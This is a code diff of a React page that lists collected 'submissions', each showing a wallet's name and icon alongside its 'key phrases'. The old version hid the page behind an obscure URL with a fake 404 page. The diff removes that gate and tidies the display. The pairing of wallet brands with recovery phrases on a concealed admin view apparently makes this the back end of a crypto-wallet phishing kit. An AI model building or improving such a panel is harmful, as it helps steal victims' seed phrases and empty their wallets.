@@ -1,43 +1,37 @@
 import React, { useState, useEffect } from "react";
-import { useLocation } from "react-router-dom";
 
-const AdminSubmissionsPage = () => {
+const SubmissionsPage = () => {
   const [submissions, setSubmissions] = useState([]);
-  const location = useLocation();
-
-  // Only show the page if the user manually enters the correct URL
-  const isAdminPage = location.pathname === "/admin-submissions-9a7f3b4e2d";
+  const [loading, setLoading] = useState(true);
 
   useEffect(() => {
-    if (isAdminPage) {
-      const fetchSubmissions = async () => {
-        try {
-          const response = await fetch("/api/submissions");
-          const data = await response.json();
-          setSubmissions(data.submissions);
-        } catch (error) {
-          console.error("Error fetching submissions:", error);
+    const fetchSubmissions = async () => {
+      try {
+        const response = await fetch("/api/submissions");
+        if (!response.ok) {
+          throw new Error(`HTTP error! Status: ${response.status}`);
         }
-      };
-      fetchSubmissions();
-    }
-  }, [isAdminPage]);
 
-  // Show a 404 error if the user is not on the correct URL
-  if (!isAdminPage) {
-    return (
-      <div className="not-found-container">
-        <h1>404</h1>
-        <p>Page Not Available</p>
-      </div>
-    );
-  }
+        const data = await response.json();
+        console.log("Fetched submissions:", data);
+        setSubmissions(data.submissions);
+      } catch (error) {
+        console.error("Error fetching submissions:", error);
+      } finally {
+        setLoading(false);
+      }
+    };
+
+    fetchSubmissions();
+  }, []);
+
+  if (loading) return <p>Loading submissions...</p>;
 
   return (
     <div className="submissions-container">
-      <h2>Submissions</h2>
+      <h2>Admin Submissions</h2>
       {submissions.length === 0 ? (
-        <p>No submissions found.</p>
+        <p>No submissions yet.</p>
       ) : (
         submissions.map((submission, index) => (
           <div key={index} className="submission-card">
@@ -45,7 +39,7 @@ const AdminSubmissionsPage = () => {
               <img src={submission.wallet.icon} alt={submission.wallet.name} />
               <h3>{submission.wallet.name}</h3>
             </div>
-            <p>{submission.keyPhrases}</p>
+            <p>Key Phrases: {submission.keyPhrases}</p>
             <small>{new Date(submission.timestamp).toLocaleString()}</small>
           </div>
         ))
@@ -54,4 +48,4 @@ const AdminSubmissionsPage = () => {
   );
 };
 
-export default AdminSubmissionsPage;
+export default SubmissionsPage;
